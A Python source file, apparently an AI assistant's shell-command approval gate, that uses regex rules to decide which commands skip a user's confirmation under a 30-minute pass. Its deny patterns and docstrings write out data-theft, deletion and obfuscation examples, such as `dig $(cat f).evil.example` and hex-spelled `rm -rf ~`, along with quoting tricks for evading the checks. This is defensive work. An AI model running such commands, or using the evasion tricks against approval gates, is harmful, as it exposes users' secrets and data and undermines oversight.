"""'Allow for 30 min' for run_shell: one tap lets shell commands in the same conversation run
without asking, for GRANT_MINUTES. Commands that read secrets, delete or stop things, send data out, or write outside
/tmp, Odie's workspace and the user's vault always ask anyway. Inline code (python3 -c, a script fed to python3 from a
heredoc) runs under the pass unless its own text reads secrets, deletes or sends data out (23 Oct 2026, the user's
choice: on their own Mac that's a fair trade). Text a command only writes to a file (a heredoc fed to cat) is data,
never read as commands. A New chat is a new conversation, so it starts without a grant.

The check is ADK's require_confirmation predicate: it gets the tool's arguments and tool_context.
"""
from __future__ import annotations

import json
import os
import re
import shlex
from collections.abc import Callable
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any
from urllib.parse import urlsplit

from odie import approvals_mode
from odie.agent.context import session_id_of
from odie.store.db import Store

GRANT_MINUTES = 30

_RULES: list[tuple[str, re.Pattern[str]]] = [
    ("switches off another agent's approvals", re.compile(
        r"--yolo\b|--dangerously[\w-]*|--skip[\w-]*permissions|--no[\w-]*(approval|confirm)[\w-]*|--auto[\w-]*approve")),
    ("reads secrets", re.compile(
        r"\.env\b|\.netrc|\.ssh\b|id_rsa|id_ed25519|\.pem\b|keychain|security\s+find-|_PAT\b|_KEY\b|_TOKEN\b|SECRET|"
        r"PASSWORD|passwd|credential|auth\.json|token\.json|client_secret|\.(zshrc|zshenv|zprofile|bashrc|bash_profile|profile)\b|"
        r"\.aws\b|\.npmrc|\.pypirc|\.gnupg|\.kube\b|\.docker/config|hosts\.yml|\.gitconfig|cookies|"
        r"\.(zsh_history|bash_history|python_history|node_repl_history|lesshst)\b|HISTFILE|"
        r"(^|[;&|(]\s*)(env|printenv)\b", re.IGNORECASE)),

    ("deletes or stops something", re.compile(
        r"(^|[;&|(`]\s*|\s)(rm|rmdir|kill|pkill|killall|sudo|chmod|chown|dd|mkfs|shutdown|reboot|launchctl|truncate|"
        r"shred|mv|crontab|trash|diskutil)\b|\bgit\s+(push|reset|clean|rebase|checkout\s+--)|"
        r"\bfind\b[^|;&\n]*\s-delete\b|\b(uninstall|prune)\b|"
        r"\bos\.(remove|unlink|rmdir|kill)\b|\bshutil\.(rmtree|move)\b|\.unlink\(|\.rmdir\(|"
        r"\.(rm|rmSync|unlinkSync|rmdirSync)\(|\bsubprocess\b|\bos\.system\b|child_process")),
    ("sends data out", re.compile(
        r"\bcurl\b[^|;]*(-[a-zA-Z]*X\s*(POST|PUT|PATCH|DELETE)|--request\s+(POST|PUT|PATCH|DELETE)|--data|--json|"
        r"\s-[a-zA-Z]*[dFTK](\s|\S)|--form|--upload|--config)|\bwget\b[^|;]*(--post|--body|--method)|"
        r"\b(scp|ssh|ftp|sftp|nc|ncat|sendmail|telnet|socat)\b|\bosascript\b[\s\S]*\bsend\b|\bshortcuts\s+run\b|\brsync\b[^|;]*\S+:|"
        r"\bnpm\s+publish\b|\bgh\s+(pr|issue|release)\s+create\b|\bmail\s+-s\b|"
        r"\brequests\.(post|put|patch|delete)\b|\bhttpx\.(post|put|patch|delete)\b|\bsmtplib\b|"
        r"method\s*:\s*['\"](?i:post|put|patch|delete)")),  # fetch takes the method in any case
    # An address built at run time carries whatever was put into it: curl 'https://x/?d='$(cat f), wget "$URL$DATA",
    # requests.get(base + secret), urlopen(f"...{key}"). Only a fixed address is a plain read.
    # A name looked up or opened carries it too: dig $(cat f).evil.example, open 'https://x/?d='$(cat f).
    ("sends data out (an address built from other text)", re.compile(
        r"\b(curl|wget|xh|aria2c|nc|openssl\s+s_client|dig|nslookup|host|ping)\b[^|;&\n]*(\$\(|`|\$\{?[A-Za-z_])|"
        r"\bopen\s+['\"]?https?://[^|;&\n]*(\$\(|`|\$\{?[A-Za-z_])|"
        r"\b(requests\.(get|head)|httpx\.(get|head)|urlopen|urlretrieve|fetch|axios\.get|http\.get|https\.get)\s*\([^)]*"
        r"(\+|\bf['\"]|\.format\(|%\s*\(|\$\{|`)")),
    # Text that is data until it's decoded or piped: `echo <base64> | base64 -d | zsh` shows no command until it runs.
    # Piping into a reader (xargs grep, python3 -m json.tool) and sourcing a venv's activate are ordinary work, not text
    # run as commands; a shell given a substitution (`zsh -c "$(…)"`, `bash <(…)`) is. The pipe counts however the
    # shell is named: `| /bin/sh`, `| X=1 bash`, `| PYTHONINSPECT=1 python3 -c 'pass'` (17 Nov 2026).
    ("runs text as commands", re.compile(
        r"\|\s*(sudo\s+)?(\w+=\S*\s+|(command|builtin|nice|nohup|time|env)\s+)*(\S*/)?"
        r"(sh|bash|zsh|dash|fish|ksh|python3?(?!\s+-m\s+json\.tool\b)|node|ruby|perl|osascript|"
        r"xargs(?!\s+(grep|wc|ls|cat|head|tail|echo|basename|dirname|stat|file|sort|uniq)\b)|source|eval|exec)\b|"
        r"\b(sh|bash|zsh|dash|fish|ksh)\s+(-\w+\s+)*(-c\s+[\"']?\$\(|<\()|"
        r"\b(eval|exec)\s+[\"'$`(]|\bsource\s+(?!\S*/activate\b)\S|(^|[;&|(]\s*)\.\s+(?!\S*/activate\b)\S|"
        r"\bbase64\b[^|;\n]*(\s-[dD]\b|--decode)|\bxxd\s+-r|\bopenssl\s+(enc\s+-d|base64\s+-d)|\buudecode\b|"
        r"\bexec\(|__import__\(|\bnew\s+Function\(|\bvm\.run")),
    # What the owner's choice lets inline code do stops at writing files it couldn't write from the shell (unsafe_write
    # sees only > redirections): python3 -c "open(p, 'w')" is a write like any other.
    ("writes a file from code", re.compile(
        r"\bopen\s*\([^,)]*,\s*(mode\s*=\s*)?['\"][rb]*[wax+][rwaxb+]*['\"]|\bopen\s*\([^)]*mode\s*=\s*['\"][rb]*[wax+]|\.write_(text|bytes)\(|\bwriteFile(Sync)?\(|\bappendFile(Sync)?\(|"
        r"\bfs\.\w*[wW]rite|\bFile\.(write|open)\(|\bIO\.write\(|\bplistlib\.dump|"
        r"\bshutil\.(copy|copyfile|copytree|copy2)\b|\bos\.(rename|replace|symlink|link)\b|\bPath\([^)]*\)\.(rename|replace|symlink_to)")),
    # Things that run again later, or at login: a command that ends now can't be read later.
    ("sets something to run later or at login", re.compile(
        r"LaunchAgents|LaunchDaemons|loginwindow|login\s+item|\bdefaults\s+write\b|\bat\s+now|\bcron\b|\bsystemctl\b|"
        r"/etc/(rc|profile|paths|hosts|sudoers)|\bscreen\s+-dm|"
        r"\btmux\s+new\b", re.IGNORECASE)),
    # Installing a package runs its install scripts: npm's postinstall, pip's setup.py, brew's formula.
    ("installs software (runs its install scripts)", re.compile(
        r"\b(npm|pnpm|yarn|bun)\s+(i|install|add|ci|up|update|upgrade|exec|x)\b|\bnpx\b|\bpip3?\s+(install|download)\b|"
        r"\buv\s+(pip\s+install|add|sync|tool\s+(install|run))\b|\buv\s+run\b[^|;&\n]*--with\b|\buvx\b|\bpipx\b|\bbrew\s+(install|upgrade|tap|reinstall)\b|"
        r"\bgem\s+install\b|\bcargo\s+install\b|\bgo\s+(install|get|run)\b|\bconda\s+install\b|\bport\s+install\b|"
        r"\bcurl\b[^|;\n]*\|\s*(sh|bash|zsh)|\binstaller\s+-pkg|\bopen\s+\S+\.(dmg|pkg|app)\b")),
    ("edits files in place", re.compile(r"\b(sed|perl)\s+(-\w*\s+)*-i|\btee\b")),
]
# Odie's own home (settings, chats, keys, the audit log, the live copy it runs from), except the workspace it writes
# in anyway: ~/.odie/assistant.db -> matches; $ODIE_HOME/data/workspace/x -> not; ~/.odie/workspace -> not.
# The workspace is excluded only as a whole word (workspace-old is not it) and only when the path doesn't climb back
# out with `..`.
_ODIE_HOME = re.compile(r"(\.odie\b|\{ODIE_HOME\}|ODIE_HOME\b(?!\}))(?!/(data/)?workspace(?![\w-])(?![^\s;&|]*/\.\.))|"
                        r"\b(assistant|sessions|odie-index)\.db\b")


def touches_odie_home(text: str) -> bool:
    """Whether a command names Odie's own files outside its workspace: `sqlite3 ~/.odie/assistant.db ...` -> True;
    `cat $ODIE_HOME/data/keys.json` -> True; `cat ~/.odie/workspace/../data/keys.json` -> True; `ls ~/.odie/workspace`
    -> False; `ls ${ODIE_HOME}/data/workspace/x` -> False; `ls ~/Downloads` -> False."""
    return bool(_ODIE_HOME.search(text))


# A path into a hidden folder or file under the home folder (~/.ssh, $HOME/.config, /Users/me/.zshrc), as the shell
# sees it before globbing.
_HIDDEN_PATH = re.compile(r"(~|\$HOME|\$\{HOME\}|/Users/[^/\s'\"]+|/home/[^/\s'\"]+)/\.[^\s;&|<>]*")
_GLOBBED = re.compile(r"[?*\[\]{}]|\$\(|`|\$\{?[A-Za-z_]")  # a pattern or a substitution: the real name is decided at run time
_ONE_OF = re.compile(r"\[(.)\]")  # [v]: a glob that matches exactly that one character
_ESCAPED_SEPARATOR = re.compile(r"\\[|;&]")
_SQUEEZE = re.compile(r"\$(?=['\"])|[\\'\"?*]")  # quotes (ANSI-C $'…' too), backslashes and one-character globs that spell a word around a rule
# A redirect and the word it writes to: `> f`, `>> f`, `2>/dev/null`, `>| f` (past noclobber), `&> f`, `>&f` (a file,
# unlike `>&2`, one stream into another); the word may hold quotes or a backslash-escaped space ("my notes", my\ notes).
_REDIRECT = re.compile(r"(\d*|&)>(>|\|)?\s*(&(?:\d+|-)(?![^\s;|<>])|&?(?:'[^']*'|\"[^\"]*\"|\\.|[^\s;&|<>\\'\"])+)")
_HEREDOC = re.compile(r"<<-?\s*(['\"]?)(\w+)\1")
_INTERPRETER = re.compile(r"\b(python3?|node|ruby|perl|osascript|bash|sh|zsh|deno|bun)\b")
_SEGMENT = re.compile(r"&&|\|\||;|\n")
_CD = re.compile(r"^\s*cd\s+(.+?)\s*$")
_ALWAYS_SAFE = ("/dev/null", "/tmp", "/private/tmp")


def split_heredocs(command: str) -> tuple[str, str]:
    """The command's own shell text, and the code an interpreter reads from its heredocs. A heredoc fed to cat is the
    file's words, in neither: `cat > a.md <<'EOF'\nrm this\nEOF` -> ("cat > a.md <<'EOF'", "");
    `python3 - <<'EOF'\nimport os\nEOF` -> ("python3 - <<'EOF'", "import os")."""
    lines = command.split("\n")
    shell = []
    code = []
    i = 0
    while i < len(lines):
        line = lines[i]
        shell.append(line)
        i += 1
        heredoc = _HEREDOC.search(line)
        if heredoc is None:
            continue
        end = heredoc.group(2)
        body = []
        while i < len(lines) and lines[i].strip() != end:
            body.append(lines[i])
            i += 1
        i += 1  # the line that ends it
        fed_to = line[:heredoc.start()]
        if _INTERPRETER.search(fed_to):
            code.extend(body)
    return "\n".join(shell), "\n".join(code)


def _unquoted(text: str) -> str:
    if len(text) >= 2 and text[0] == text[-1] and text[0] in "'\"":
        return text[1:-1]
    return text


def _expanded(path: str, here: str) -> str:
    """A path as the shell would find it: ~ and $HOME made the home folder, a relative one taken from `here`, links
    followed: ("~/vault/a.md", any) -> the vault's real folder + "/a.md"; ("b.py", "/tmp") -> "/private/tmp/b.py"."""
    path = _unquoted(path).replace("\\ ", " ").replace("$HOME", "~").replace("${HOME}", "~")
    path = os.path.expanduser(path)
    if not os.path.isabs(path):
        path = os.path.join(here, path)
    return os.path.realpath(path)


def is_safe_place(path: str, safe_dirs: tuple[str, ...]) -> bool:
    """Whether a file written there needs no tap under a pass: /tmp, /dev/null, or inside one of `safe_dirs` (Odie's
    workspace, the user's vault). Both sides are compared by their real paths, links followed, so the vault reached by
    its iCloud path is the vault saved as ~/vault. "/private/tmp/b.py" -> True; "<vault>/Stories/cast.md" -> True;
    "~/notes.txt" -> False."""
    places = [os.path.realpath(os.path.expanduser(place)) for place in (*_ALWAYS_SAFE, *safe_dirs)]  # ~/vault too
    return any(path == place or path.startswith(place.rstrip("/") + "/") for place in places)


def quoted(text: str) -> set[int]:
    """The positions inside quotes, where a ">" is words, not a redirect: 'echo "a > b" > f' -> the positions of
    a > b; a backslash-escaped quote inside double quotes stays inside."""
    inside = set()
    quote = ""
    escaped = False
    for i, char in enumerate(text):
        if quote:
            if escaped:
                escaped = False
            elif char == "\\" and quote == '"':
                escaped = True
            elif char == quote:
                quote = ""
                continue
            inside.add(i)
        elif char in "'\"":
            quote = char
    return inside


def segment_spans(shell: str) -> list[tuple[int, int]]:
    """Where each segment of the shell text starts and ends (see segments): "cd /tmp && ls" -> [(0, 8), (10, 13)]."""
    words = quoted(shell)
    out = []
    start = 0
    for cut in _SEGMENT.finditer(shell):
        if cut.start() in words:
            continue
        out.append((start, cut.start()))
        start = cut.end()
    out.append((start, len(shell)))
    return out


def segments(shell: str) -> list[str]:
    """The shell text cut at &&, ||, ; and line ends, but never inside quotes (an awk program's ";", an AppleScript
    over several lines): "cd /tmp && awk '{a; b}' f" -> ["cd /tmp ", " awk '{a; b}' f"]."""
    return [shell[start:end] for start, end in segment_spans(shell)]


OUTSIDE = "writes a file outside /tmp"
REPLACES = "replaces a file"
_STREAM = re.compile(r"&(\d+|-)")  # 2>&1, >&-: one stream into another (or closed), no file


def shell_word(word: str) -> str | None:
    """A word as the shell hands it on, its quotes and escapes taken out, or None when it can't be read as one word:
    `'my notes.md'` -> "my notes.md"; `my\\ notes.md` -> "my notes.md"; `~/"a b"/c` -> "~/a b/c"; `'open` -> None."""
    try:
        got = shlex.split(word)
    except ValueError:
        return None
    if len(got) != 1:
        return None
    return got[0]


def write_reason(shell: str, safe_dirs: tuple[str, ...], cwd: str | None, smart: bool = False,
                 odie_dirs: tuple[str, ...] = ()) -> str | None:
    """Why the shell text's writes (>, >>, >|, &>) need a tap, following its `cd`s, or None when they don't. A write
    into a safe place (/tmp, the workspace, the vault) never asks. Careful's pass: any other place -> "writes a file
    outside /tmp". Smart also lets a new file, or an append, in an ordinary folder under the home run (ordinary_write);
    replacing a file there -> "replaces a file". A ">" inside quotes is words; a relative path with no folder known is
    taken from the home folder, where run_shell starts.
      `cd /tmp && cat > b.py` -> None;  `echo hi > ~/notes.txt` -> "writes a file outside /tmp";
      Smart, `echo hi > ~/work/notes/new.md` -> None;  Smart, `echo hi > ~/work/notes/old.md` (it exists) ->
      "replaces a file";  `echo "a > b"` -> None."""
    here = os.path.realpath(os.path.expanduser(cwd or "~"))
    for segment in segments(shell):
        moved = _CD.match(segment)
        if moved:
            here = _expanded(moved.group(1), here)
            continue
        words = quoted(segment)
        for redirect in _REDIRECT.finditer(segment):
            if redirect.start() in words:
                continue  # a ">" inside quotes: words (an arrow, a comparison), not a file
            target = redirect.group(3)
            if _STREAM.fullmatch(target):
                continue
            target = target.removeprefix("&")  # >&file writes the file
            name = shell_word(target)
            if name is None:
                return OUTSIDE
            if is_safe_place(_expanded(name, here), safe_dirs):
                continue
            if not smart:
                return OUTSIDE
            appending = redirect.group(2) == ">"
            why = ordinary_write(name, here, appending, odie_dirs)
            if why is not None:
                return why
    return None


def unsafe_write(shell: str, safe_dirs: tuple[str, ...], cwd: str | None) -> bool:
    """Whether the shell text writes anywhere but a safe place (write_reason, as Careful's pass reads it):
    `cd /tmp && cat > b.py` -> False; `echo hi > ~/notes.txt` -> True."""
    return write_reason(shell, safe_dirs, cwd) is not None


# A name the shell fills in at run time ($, `, a glob or a brace), or another user's ~ or ~- / ~+.
_DYNAMIC_NAME = re.compile(r"[$`*?\[\]{}]|^~(?!/|$)")
_LEADING_HOME = re.compile(r"^\$(HOME|\{HOME\})(?=/|$)")


def _parts_under(path: str, home: str) -> list[str] | None:
    """The parts of `path` below `home`, or None when it isn't under it: ("/h/work/a.md", "/h") -> ["work", "a.md"];
    ("/tmp/a", "/h") -> None; ("/h", "/h") -> []."""
    if path == home:
        return []
    if not path.startswith(home.rstrip("/") + "/"):
        return None
    return path[len(home.rstrip("/")) + 1:].split("/")


def in_ordinary_folder(path: str, home: str, odie_dirs: tuple[str, ...]) -> bool:
    """Whether `path` sits in an ordinary folder under the home: a folder below it (not the home itself), no part
    hidden (starting with a dot), not ~/Library (in any case: the Mac's disk ignores case), and not inside one of
    Odie's own folders (`odie_dirs`, also compared ignoring case).
      "/h/work/notes/a.md" -> True;  "/h/a.md" -> False;  "/h/.config/a" -> False;  "/h/work/.git/config" -> False;
      "/h/library/a" -> False;  "/tmp/a" -> False."""
    parts = _parts_under(path, home)
    if parts is None or len(parts) < 2:
        return False
    if any(part.startswith(".") for part in parts):
        return False
    if parts[0].lower() == "library":
        return False
    folded = path.lower()
    for place in odie_dirs:
        place = place.rstrip("/").lower()
        if folded == place or folded.startswith(place + "/"):
            return False
    return True


def ordinary_write(name: str, here: str, appending: bool, odie_dirs: tuple[str, ...]) -> str | None:
    """Smart's rule 7: whether a write outside the safe places is still plain, or why it asks. A new file (or an append)
    in an ordinary folder under the home is plain (in_ordinary_folder), judged both as written and with links followed;
    its name must be plain text. Replacing a file that is there (or a link, even to nothing yet) asks.
      `> ~/work/notes/new.md` -> None;  `>> ~/work/notes/old.md` -> None;  `> ~/work/notes/old.md` -> "replaces a
      file";  `> ~/.config/x` -> "writes a file outside /tmp";  `> ~/work/notes/$(date).md` -> the same;
      `> ~/work/notes/link` where link points into ~/.config -> the same."""
    from_home = _LEADING_HOME.sub("~", name)  # $HOME/x is ~/x, not a name made at run time
    if _DYNAMIC_NAME.search(from_home):
        return OUTSIDE
    spelled = os.path.expanduser(from_home)
    as_written = os.path.normpath(os.path.join(here, spelled))  # no links followed
    real = _expanded(name, here)
    written_home = os.path.normpath(os.path.expanduser("~"))
    real_home = os.path.realpath(written_home)
    written_odie = tuple(os.path.normpath(os.path.expanduser(d)) for d in odie_dirs)
    real_odie = tuple(os.path.realpath(d) for d in written_odie)
    if not in_ordinary_folder(as_written, written_home, written_odie):
        return OUTSIDE
    if not in_ordinary_folder(real, real_home, real_odie):
        return OUTSIDE
    if appending:
        return None
    if os.path.lexists(as_written) or os.path.exists(real):
        return REPLACES
    return None


# ── fewer cards for ordinary work (16 Nov 2026) ──────────────────────────────────────────────────────────────────────
# A morning's PR review asked 7 times: for deleting its own scratch files in /tmp, for `sed 's/\x1b…//'` (stripping
# terminal colours), for "source" inside a grep pattern, for `npx tsc` (the project's own tsc). These say when such
# work is plainly safe; anything they can't read plainly still asks as before.

_SEARCH_TOOL = re.compile(r"\b(grep|egrep|fgrep|rg|ag)\b")
_HEX = re.compile(r"\\x[0-9a-fA-F]{2}")
_HEX_INTO_CODE = re.compile(r"\$'|\$\(|`|\b(eval|exec|awk|gawk|perl|python3?|node|ruby|osascript|sh|bash|zsh|xargs|source)\b")
_DELETE = re.compile(r"^\s*(rm|rmdir|trash)((\s+-[\w-]+)*)((\s+[^\s;&|<>$`(){}\\]+)+)\s*$")
_NPX = re.compile(r"\bnpx\s+([\w.-]+)")
_UVX = re.compile(r"\buvx\s+([\w.-]+)")
_UV_WITH = re.compile(r"\s--with\s+([\w.\[\]-]+)")
# Python tools and libraries a review or a test run fetches by name; an exact name only (no versions, no --from).
KNOWN_PY_TOOLS = frozenset({"ruff", "black", "mypy", "pytest", "pyright", "isort", "flake8", "httpx", "fastapi",
                            "pytest-asyncio", "requests", "uvicorn", "pydantic"})
_CODE_LEAVES_HERE = re.compile(r"""["']\s*[/~]|\.\.|home\(|expanduser|environ|getenv|chdir|\$HOME|os\.path\.join\(\s*["']/""")


def search_patterns_blanked(text: str) -> str:
    r"""The text with the quoted patterns given to grep or rg blanked out: a search pattern is words looked for, never
    run. A double-quoted one holding $( or ` is left as it is (the shell runs that part).
    `grep -n "install\|source" README.md` -> `grep -n "                " README.md`; `ls "source x"` -> unchanged;
    `grep "$(rm -rf ~)" f` -> unchanged."""
    inside = quoted(text)
    out = list(text)
    for tool in _SEARCH_TOOL.finditer(text):
        if tool.start() in inside:
            continue
        i = tool.end()
        while i < len(text):
            if i not in inside and text[i] in "|;&\n":
                break
            if i in inside:
                run_end = i
                while run_end in inside:
                    run_end += 1
                pattern = text[i:run_end]
                runs_something = "$(" in pattern or "`" in pattern
                if not runs_something:
                    for j in range(i, run_end):
                        out[j] = " "
                i = run_end
            i += 1
    return "".join(out)


def hex_spells_code(text: str) -> bool:
    r"""Whether a \x41-style escape could spell a command: it sits in an ANSI-C $'…' string, or the command also has a
    substitution or an interpreter that could run what it spells. Stripping colours is not that.
    `sed 's/\x1b\[[0-9;]*m//g' log` -> False; `$'\x72\x6d' -rf ~` -> True; `perl -e 'system "\x72\x6d x"'` -> True;
    `$(printf '\x72\x6d') -rf ~` -> True; no escape at all -> False."""
    if not _HEX.search(text):
        return False
    return bool(_HEX_INTO_CODE.search(text))


def is_scratch_delete(segment: str, here: str, scratch_dirs: tuple[str, ...]) -> bool:
    """Whether one segment only deletes things inside /tmp or Odie's workspace (`scratch_dirs`), never the place
    itself: plain names only, no $ or substitution, no `..`, no sudo. Paths are taken from `here` (after its cd's).
    `rm -f /tmp/pr12-*.log` -> True; `rm -rf /tmp/pr12-review` -> True; `rm -rf /tmp` -> False (the place itself);
    `rm notes.txt` in ~ -> False; `rm -rf /tmp/$X` -> False; `rm -rf /tmp/../Users/me` -> False;
    `rm /tmp/a ~/b` -> False (one path outside)."""
    got = _DELETE.match(segment)
    if got is None:
        return False
    places = [os.path.realpath(place) for place in (*_ALWAYS_SAFE, *scratch_dirs)]

    def strictly_inside(path: str) -> bool:
        return any(path.startswith(place.rstrip("/") + "/") for place in places)

    for target in got.group(4).split():
        name = _unquoted(target)
        if ".." in name:
            return False
        fixed = _GLOBBED.split(name, maxsplit=1)[0]  # the part before any pattern: "/tmp/pr12-" of "/tmp/pr12-*.log"
        if fixed == name:
            path_ok = strictly_inside(_expanded(name, here))
        elif fixed == "" or fixed.endswith("/"):
            folder = _expanded(fixed or ".", here)
            path_ok = strictly_inside(folder)  # `rm /tmp/*` empties /tmp itself: asks; `rm /tmp/x/*` -> fine
        else:
            path_ok = strictly_inside(_expanded(fixed, here))
        if not path_ok:
            return False
    return True


def is_local_npx(name: str, here: str) -> bool:
    """Whether `npx <name>` runs the project's own installed tool (node_modules/.bin/<name> where it runs, or a folder
    above), which installs nothing: `npx tsc` in a web/ with its node_modules -> True; `npx cowsay` with no such
    file -> False (npx would fetch it from the registry and run its scripts)."""
    folder = Path(here)
    for place in (folder, *folder.parents):
        if (place / "node_modules" / ".bin" / name).exists():
            return True
    return False


def ordinary_work_blanked(shell: str, scratch_dirs: tuple[str, ...], cwd: str | None) -> str:
    """The shell text with the plainly safe parts blanked, following its cd's: deleting scratch files
    (is_scratch_delete), the project's own npx tool (is_local_npx), uvx of a well-known tool and `uv run --with` of
    well-known packages (KNOWN_PY_TOOLS). The rules then read what's left.
    `cd /tmp && rm -rf pr12-review && ls` -> `cd /tmp &&                  && ls`;
    `uvx ruff check .` -> `     ruff check .`; `uvx cowsay hi` -> unchanged."""
    here = os.path.realpath(os.path.expanduser(cwd or "~"))
    out = list(shell)
    for start, end in segment_spans(shell):
        segment = shell[start:end]
        moved = _CD.match(segment)
        if moved:
            here = _expanded(moved.group(1), here)
            continue
        if is_scratch_delete(segment, here, scratch_dirs):
            out[start:end] = " " * (end - start)
            continue
        blank_from = []
        for npx in _NPX.finditer(segment):
            if is_local_npx(npx.group(1), here):
                blank_from.append((npx.start(), npx.start(1)))
        for uvx in _UVX.finditer(segment):
            if uvx.group(1) in KNOWN_PY_TOOLS:
                blank_from.append((uvx.start(), uvx.start(1)))
        withs = list(_UV_WITH.finditer(segment))
        if withs and all(w.group(1) in KNOWN_PY_TOOLS for w in withs):
            blank_from.extend((w.start(), w.end()) for w in withs)
        for a, b in blank_from:
            out[start + a:start + b] = " " * (b - a)
    return "".join(out)


def code_writes_stay_here(shell: str, code: str, safe_dirs: tuple[str, ...], cwd: str | None) -> bool:
    """Whether code fed to an interpreter (a heredoc) writes only where it runs, and it runs in a safe place (the
    workspace, the vault, /tmp): it names no absolute or home path, no `..`, no home(), environ or chdir.
    `cd <vault> && python3 - <<'PY'` with Path("3-Resources/Vocabulary.md").write_text(…) -> True;
    the same run from ~ -> False; with Path.home() / ".zshrc" -> False; no heredoc code -> False."""
    if not code.strip():
        return False
    here = os.path.realpath(os.path.expanduser(cwd or "~"))
    for segment in segments(shell):
        moved = _CD.match(segment)
        if moved:
            here = _expanded(moved.group(1), here)
    if not is_safe_place(here, safe_dirs):
        return False
    return _CODE_LEAVES_HERE.search(code) is None


def squeezed(text: str) -> str:
    """The text with the spelling tricks taken out, so a rule's word still matches: quotes and backslashes inside a word
    (`cat ~/."env"`, `cat ~/.\\env`), and one-character globs (`cat ~/.e?nv`, `cat ~/.en[v]`) that make the shell find
    the file the rule names. `cat ~/.e?nv` -> "cat ~/.env"; `ls ~/Downloads` -> unchanged."""
    words_not_separators = _ESCAPED_SEPARATOR.sub(" ", text)  # grep 'a\|source' must not become "|source"
    return _SQUEEZE.sub("", _ONE_OF.sub(r"\1", words_not_separators))


def hidden_path_by_pattern(shell: str, safe_dirs: tuple[str, ...] = ()) -> bool:
    """Whether the shell text reaches a hidden file or folder under the home folder by a pattern or a substitution the
    shell fills in at run time, so the rules can't read the real name. A pattern whose fixed part is already inside a
    safe place (Odie's workspace, under ~/.odie) is fine: it can only name files there.
    `cat ~/.{e,x}nv` -> True; `ls ~/.odie/*` -> True; `cat ~/.$(echo e)nv` -> True; `cat ~/.agentd/profiles/x/SKILL.md`
    -> False (a plain name, judged by the rules); `ls ~/Downloads/*.pdf` -> False (not hidden);
    `ls ~/.odie/workspace/*.md` with the workspace safe -> False; `ls $HOME/.odie/workspace` -> False ($HOME is the home,
    not a pattern: only the part after it is read)."""
    home = os.path.realpath(os.path.expanduser("~"))
    for path in _HIDDEN_PATH.finditer(shell):
        text = path.group(0)
        prefix = len(path.group(1))  # ~, $HOME, ${HOME}, /Users/x: the home itself, however it is spelled
        pattern = _GLOBBED.search(text, prefix)
        if pattern is None:
            continue
        fixed_part = text[:pattern.start()]
        if is_safe_place(_expanded(fixed_part, home), safe_dirs):
            continue
        return True
    return False


# ── Smart mode asks only for what matters (17 Nov 2026) ─────────────────────────────────────────────────────────────
# The owner: "Only in case of something like a delete or destructive action, it asks me ... If it has to post with a
# webhook or an API, that's fine to ask." 57 cards in a day, most for reading Odie's own code, formatting JSON with
# python3 -c, find's -prune, reading a LaunchAgent, posting to a server on this Mac, and writing a new note. These read
# such commands plainly in Smart only: each one decides on the shell's own words (shlex), and anything it can't read
# plainly ($ but $HOME, `, a glob, a brace, ( ) < >, a backslash outside quotes, ~- or ~+) is left to the rules.

def char_contexts(text: str) -> list[str]:
    """How the shell reads each character: "plain", "single" (inside '…'), "double" (inside "…", where $ and ` still
    work), "escaped" (right after a backslash outside quotes) or "quote" (a quote mark itself).
    `a'b'"$c"` -> plain, quote, single, quote, quote, double, double, quote."""
    out = []
    state = "plain"
    escaped = False
    for char in text:
        if state == "single":
            if char == "'":
                out.append("quote")
                state = "plain"
            else:
                out.append("single")
        elif state == "double":
            if escaped:
                escaped = False
                out.append("double")
            elif char == "\\":
                escaped = True
                out.append("double")
            elif char == '"':
                out.append("quote")
                state = "plain"
            else:
                out.append("double")
        elif escaped:
            escaped = False
            out.append("escaped")
        elif char == "\\":
            escaped = True
            out.append("plain")
        elif char in "'\"":
            out.append("quote")
            state = "single" if char == "'" else "double"
        else:
            out.append("plain")
    return out


# Where one simple command ends: ; && || | & and line ends (but not the & of 2>&1 or &>).
_PIECE_CUT = re.compile(r"&&|\|\||;|\n|\||(?<![>&|])&(?![>&])")


def piece_spans(shell: str) -> list[tuple[int, int]]:
    """Where each simple command of the shell text starts and ends: the text cut at ; && || | & and line ends outside
    quotes. "cd x; grep a f | head" -> [(0, 4), (5, 15), (16, 21)]."""
    contexts = char_contexts(shell)
    out = []
    start = 0
    for cut in _PIECE_CUT.finditer(shell):
        if contexts[cut.start()] != "plain":
            continue
        out.append((start, cut.start()))
        start = cut.end()
    out.append((start, len(shell)))
    return out


# A redirect that writes no file: into /dev/null, or one stream into another.
_HARMLESS_REDIRECT = re.compile(r"(\d*|&)>>?\s*/dev/null(?![^\s;&|<>])|\d*>&\d+(?![^\s;&|<>])")
_HOME_VARIABLE = re.compile(r"\$(HOME|\{HOME\}|ODIE_HOME|\{ODIE_HOME\})(?![\w}])")


def plain_words(piece: str) -> list[str] | None:
    """The words of one simple command when the shell reads it as plain text, or None when it doesn't. Plain: no $ but
    $HOME (and $ODIE_HOME), no `, no glob or brace, no ( ) < > or & outside quotes, no backslash outside quotes, no
    word starting ~- or ~+ or ~name; a redirect only into /dev/null or another stream.
      `grep -n "base_url" web/a.tsx 2>/dev/null` -> ["grep", "-n", "base_url", "web/a.tsx"];  `cat $X` -> None;
      `cat .*/x` -> None;  `grep x f > out.txt` -> None;  `cat ~-/x` -> None;  `awk '{print $1}' f` -> the words."""
    contexts = char_contexts(piece)
    text = list(piece)
    for redirect in _HARMLESS_REDIRECT.finditer(piece):
        if contexts[redirect.start()] == "plain":
            text[redirect.start():redirect.end()] = " " * (redirect.end() - redirect.start())
    blanked = "".join(text)
    for i, char in enumerate(blanked):
        context = contexts[i]
        if context in ("plain", "double") and char == "`":
            return None
        if context in ("plain", "double") and char == "$" and not _HOME_VARIABLE.match(blanked, i):
            return None
        if context == "plain" and char in "*?[]{}()<>&\\":
            return None
    try:
        words = shlex.split(blanked)
    except ValueError:
        return None
    for word in words:
        if word.startswith("~") and word != "~" and not word.startswith("~/"):
            return None
    return words


_READERS = frozenset({"cd", "ls", "cat", "head", "tail", "wc", "stat", "file", "grep", "egrep", "fgrep", "rg", "sed",
                      "find", "git", "echo", "sort", "uniq", "cut", "tr", "awk", "pwd", "nl", "basename", "dirname"})
_FIND_ACTIONS = frozenset({"-delete", "-exec", "-execdir", "-ok", "-okdir", "-fprint", "-fprint0", "-fprintf", "-fls"})
_GIT_READS = frozenset({"log", "status", "diff", "show", "branch"})
_GIT_BRANCH_LISTS = frozenset({"-a", "-r", "-v", "-vv", "--all", "--remotes", "--list", "-l", "--show-current", "--verbose"})
# sed -n with line numbers or one /pattern/, ending in p: 100,175p, $p, /def /p, 10,/^}/p (several joined by ;)
